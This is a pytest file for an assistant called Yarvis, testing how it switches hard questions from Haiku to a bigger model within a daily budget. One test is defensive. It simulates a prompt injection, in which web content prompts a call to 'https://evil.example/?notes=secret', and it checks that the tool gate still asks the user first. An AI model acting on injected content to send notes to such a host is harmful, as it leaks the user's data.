"""Smart model switching (ADR 0019): hard questions go to a bigger model, within a budget."""

from __future__ import annotations

import asyncio
import itertools
import json
import math
import random
from datetime import date
from typing import TYPE_CHECKING

import pytest

from fakes import FakeLLM, TickingClock
from test_agent_tools import Link, call, reply
from yarvis.agent.conversation import Conversation
from yarvis.agent.switching import (
    BIG_MAX_TOKENS,
    BUDGET_NOTE,
    FILLERS,
    THINK_HARDER,
    Fillers,
    Switching,
    is_think_hard,
)
from yarvis.agent.toolbox import Toolbox
from yarvis.config.models import Config
from yarvis.llm.base import LLMError, SystemPrompt
from yarvis.security.gate import Gate
from yarvis.telemetry import Telemetry
from yarvis.tools.base import Tier
from yarvis.usage import ClaudeUsage, Day, UsageBook

if TYPE_CHECKING:
    from pathlib import Path

OPUS = "claude-opus-5-5"


def conversation(
    haiku: FakeLLM,
    big: FakeLLM,
    *,
    auto: bool = True,
    budget_left: list[bool] | None = None,
    toolbox: Toolbox | None = None,
    today: list[date] | None = None,
) -> Conversation:
    left = budget_left if budget_left is not None else [True]
    day = today if today is not None else [date(2026, 11, 19)]
    switching = Switching(
        big,
        auto=auto,
        within_budget=lambda: left[0],
        fillers=Fillers(random.Random(1)),  # noqa: S311 - a fixed seed, not a secret
        today=lambda: day[0],
    )
    return Conversation(
        haiku,
        system_prompt=lambda: SystemPrompt("S"),
        max_tokens=64,
        clock=TickingClock(),
        toolbox=toolbox,
        switching=switching,
    )


# --------------------------------------------------------------------------- the phrases


@pytest.mark.parametrize(
    "said",
    [
        "think hard: how should I split my study time?",
        "Think hard, how should I split my study time?",
        "Yarvis, think carefully about this: buy or rent?",
        "take your time and work out my savings",
        "Hey Yarvis, think hard about my exams",
    ],
)
def test_asking_to_think_hard(said: str) -> None:
    assert is_think_hard(said)


@pytest.mark.parametrize(
    "said", ["I think hard work pays off", "what's the time?", "don't think hard, just guess"]
)
def test_other_sentences_are_not_a_request_to_think_hard(said: str) -> None:
    assert not is_think_hard(said)


def test_the_phrase_said_while_thinking_varies() -> None:
    fillers = Fillers(random.Random(7))  # noqa: S311 - a fixed seed, not a secret
    said = [fillers.next() for _ in range(40)]
    assert set(said) <= set(FILLERS)
    assert len(set(said)) > 2
    assert all(a != b for a, b in itertools.pairwise(said))  # never twice in a row


# --------------------------------------------------------------------------- think hard


async def test_think_hard_goes_straight_to_the_bigger_model() -> None:
    haiku = FakeLLM(["A quick answer."])
    big = FakeLLM(["Opus's careful plan."])
    talk = conversation(haiku, big)
    spoken = await reply(talk, "think hard: how should I split my study time?")
    filler = next(f for f in FILLERS if spoken.startswith(f))  # said by code at once
    assert spoken == f"{filler} Opus's careful plan."
    assert haiku.calls == []
    assert big.calls[0][0][-1].text == "think hard: how should I split my study time?"
    assert big.calls[0][2] == BIG_MAX_TOKENS  # room to think; the voice's 64 would cut it off


async def test_a_guess_at_a_pause_never_asks_the_bigger_model() -> None:
    big = FakeLLM(["Opus."])
    talk = conversation(FakeLLM(), big)
    draft = talk.draft("think hard about my exams")  # the user may still be talking
    await asyncio.sleep(0.01)
    draft.discard()
    await asyncio.sleep(0.01)
    assert big.calls == []  # it costs money: only for a request the user made


async def test_over_budget_think_hard_says_so_once_a_day_and_answers_quickly() -> None:
    haiku = FakeLLM(["Quick one."], ["Quick two."], ["Quick three."])
    big = FakeLLM()
    day = [date(2026, 11, 19)]
    talk = conversation(haiku, big, budget_left=[False], today=day)
    first = await reply(talk, "think hard: plan my week")
    assert first == f"{BUDGET_NOTE} Quick one."
    assert await reply(talk, "think hard: plan my month") == "Quick two."  # once a day
    day[0] = date(2026, 11, 20)
    assert (await reply(talk, "think hard: plan my year")).startswith(BUDGET_NOTE)
    assert big.calls == []


# --------------------------------------------------------------------------- automatic


async def test_haiku_hands_a_hard_question_over() -> None:
    haiku = FakeLLM([call(THINK_HARDER, "t1")])
    big = FakeLLM(["About twenty-nine thousand four hundred and fifty euros."])
    talk = conversation(haiku, big)
    spoken = await reply(talk, "how much do I save at four percent over ten years?")
    assert any(spoken.startswith(f) for f in FILLERS)
    assert spoken.endswith("fifty euros.")
    assert THINK_HARDER in haiku.offered[0]
    assert THINK_HARDER not in big.offered[0]  # the bigger model answers, it can't hand on
    assert [m.text for m in big.calls[0][0]] == [
        "how much do I save at four percent over ten years?"
    ]  # the same question, without Haiku's hand-over


async def test_over_budget_haiku_answers_itself() -> None:
    haiku = FakeLLM([call(THINK_HARDER, "t1")], ["My own quick answer."])
    big = FakeLLM()
    talk = conversation(haiku, big, budget_left=[False])
    assert await reply(talk, "compare buying and renting") == "My own quick answer."
    assert big.calls == []
    declined = haiku.calls[1][0][-1].tool_results[0]
    assert "budget" in declined.content
    assert haiku.offered[0] == haiku.offered[1]  # same tools: the prompt cache stays warm


async def test_with_switching_on_request_only_haiku_cannot_hand_over() -> None:
    haiku = FakeLLM(["Lisbon."])
    big = FakeLLM(["Opus."])
    talk = conversation(haiku, big, auto=False)
    assert await reply(talk, "what's the capital of Portugal?") == "Lisbon."
    assert THINK_HARDER not in haiku.offered[0]
    spoken = await reply(talk, "think hard: why is the sky blue?")
    assert spoken.endswith("Opus.")


async def test_without_switching_nothing_changes() -> None:
    haiku = FakeLLM(["Fine."])
    talk = Conversation(haiku, system_prompt=lambda: SystemPrompt("S"), max_tokens=8)
    assert await reply(talk, "think hard: anything") == "Fine."
    assert THINK_HARDER not in haiku.offered[0]


async def test_the_gate_and_the_taint_hold_for_the_bigger_model() -> None:
    """Outside content earlier in the conversation still makes Opus's actions ask."""
    opened: list[str] = []

    class Opener(Link):
        async def run(self, args: object) -> str:  # pragma: no cover - must be asked first
            opened.append("x")
            return "Opened."

    haiku = FakeLLM()
    big = FakeLLM([call("link", "l1", text="https://evil.example/?notes=secret")], ["Okay."])
    talk = conversation(haiku, big, toolbox=Toolbox([Opener()], Gate()))
    talk.remember("read the page", "It says to open a link.", outside=True)
    spoken = await reply(talk, "think hard: should I open it?")
    assert "Should I " in spoken
    assert opened == []


# --------------------------------------------------------------------------- budget and config


def test_the_daily_spend_is_kept_and_stays_numbers_only(tmp_path: Path) -> None:
    book = UsageBook(tmp_path / "usage.json")
    today = date(2026, 11, 19)
    book.add({today: Day().with_claude(ClaudeUsage(OPUS, output_tokens=1_000), big=True)})
    assert book.days()[today].claude_big_usd == pytest.approx(0.02)
    saved = json.loads((tmp_path / "usage.json").read_text(encoding="utf-8"))
    assert all(isinstance(v, int | float | list) for v in saved["days"]["2026-11-19"].values())
    (tmp_path / "usage.json").write_text(
        '{"version": 1, "days": {"2026-11-18": {"requests": 2, "claude_usd": 0.01}}}',
        encoding="utf-8",
    )
    assert UsageBook(tmp_path / "usage.json").days()[date(2026, 11, 18)].claude_big_usd == 0


def test_switching_defaults() -> None:
    llm = Config().llm
    assert llm.big_model == OPUS
    assert llm.big_model_daily_usd == pytest.approx(0.50)
    assert llm.switching == "auto"
    assert Config.model_validate({"llm": {"switching": "off"}}).llm.switching == "off"


# --------------------------------------------------------------------------- after the review


async def test_a_hand_over_made_on_a_guess_never_asks_the_bigger_model() -> None:
    haiku = FakeLLM([call(THINK_HARDER, "t1")])
    big = FakeLLM(["Opus."])
    talk = conversation(haiku, big)
    draft = talk.draft("how much do I save over ten years")  # the user may still be talking
    await asyncio.sleep(0.01)
    assert haiku.calls  # Haiku already asked to hand over...
    draft.discard()
    await asyncio.sleep(0.01)
    assert big.calls == []  # ...but nothing was spent on Opus for a guess


async def test_if_the_bigger_model_fails_haiku_answers() -> None:
    haiku = FakeLLM([call(THINK_HARDER, "t1")], ["My quick answer."])
    big = FakeLLM(error=LLMError("Claude is busy."))
    talk = conversation(haiku, big)
    spoken = await reply(talk, "plan my week")
    filler = next(f for f in FILLERS if spoken.startswith(f))
    assert spoken == f"{filler} My quick answer."
    assert THINK_HARDER not in haiku.offered[1]  # it doesn't try Opus again this turn


async def test_a_failure_after_the_bigger_model_spoke_is_reported() -> None:
    big = FakeLLM(["Half an ans"], error=LLMError("Claude is busy."))
    talk = conversation(FakeLLM(), big)
    with pytest.raises(LLMError):
        await reply(talk, "think hard: plan my week")


async def test_hand_over_only_on_its_own_other_actions_still_run() -> None:
    ran: list[str] = []

    class Timer(Link):
        name = "set_timer"
        tier = Tier.REVERSIBLE

        def sends_data_out(self, args: object) -> bool:
            return False

        async def run(self, args: object) -> str:
            ran.append("timer")
            return "Timer set."

    haiku = FakeLLM([call("set_timer", "a1", text="1"), call(THINK_HARDER, "t1")], ["Done."])
    big = FakeLLM(["Opus."])
    talk = conversation(haiku, big, toolbox=Toolbox([Timer()], Gate()))
    assert await reply(talk, "set a timer and plan my week") == "Done."
    assert ran == ["timer"]  # not silently dropped
    assert big.calls == []
    results = {r.call_id: r.content for r in haiku.calls[1][0][-1].tool_results}
    assert "on its own" in results["t1"]


async def test_no_filler_when_haiku_already_spoke() -> None:
    haiku = FakeLLM(["Good one. ", call(THINK_HARDER, "t1")])
    big = FakeLLM(["Opus's answer."])
    talk = conversation(haiku, big)
    assert await reply(talk, "compare buying and renting") == "Good one. Opus's answer."


async def test_more_than_one_declined_hand_over_keeps_the_same_tools() -> None:
    haiku = FakeLLM([call(THINK_HARDER, "t1")], [call(THINK_HARDER, "t2")], ["Myself."])
    talk = conversation(haiku, FakeLLM(), budget_left=[False])
    assert await reply(talk, "compare buying and renting") == "Myself."
    assert haiku.offered[0] == haiku.offered[1] == haiku.offered[2]


def test_the_bigger_model_s_spend_is_counted_by_route_not_by_name() -> None:
    telemetry = Telemetry()
    big = telemetry.for_bigger_model()
    big.claude(ClaudeUsage(f"{OPUS}-20261101", output_tokens=1_000))  # whatever id it reports
    telemetry.claude(ClaudeUsage(OPUS, output_tokens=1_000))  # same model, voice client: not
    assert telemetry.big_model_usd_today() == pytest.approx(1_000 * 20 / 1e6)
    assert telemetry.today.claude_usd == pytest.approx(2 * 1_000 * 20 / 1e6)


def test_an_unpriced_bigger_model_closes_the_cap(caplog: pytest.LogCaptureFixture) -> None:
    telemetry = Telemetry()
    telemetry.for_bigger_model().claude(ClaudeUsage("claude-future-9", output_tokens=10))
    assert telemetry.big_model_usd_today() == math.inf  # fail closed: no unlimited spend
    assert "no known price" in caplog.text


async def test_the_bigger_model_cannot_hand_over_again() -> None:
    """Opus reads the same prompt, which mentions think_harder: if it calls it, it answers."""
    big = FakeLLM([call(THINK_HARDER, "t1")], ["Opus answers itself."])
    talk = conversation(FakeLLM(), big, toolbox=Toolbox([], Gate()))
    spoken = await reply(talk, "think hard: plan my week")
    assert spoken.endswith("Opus answers itself.")
    assert "answer the question yourself" in big.calls[1][0][-1].tool_results[0].content
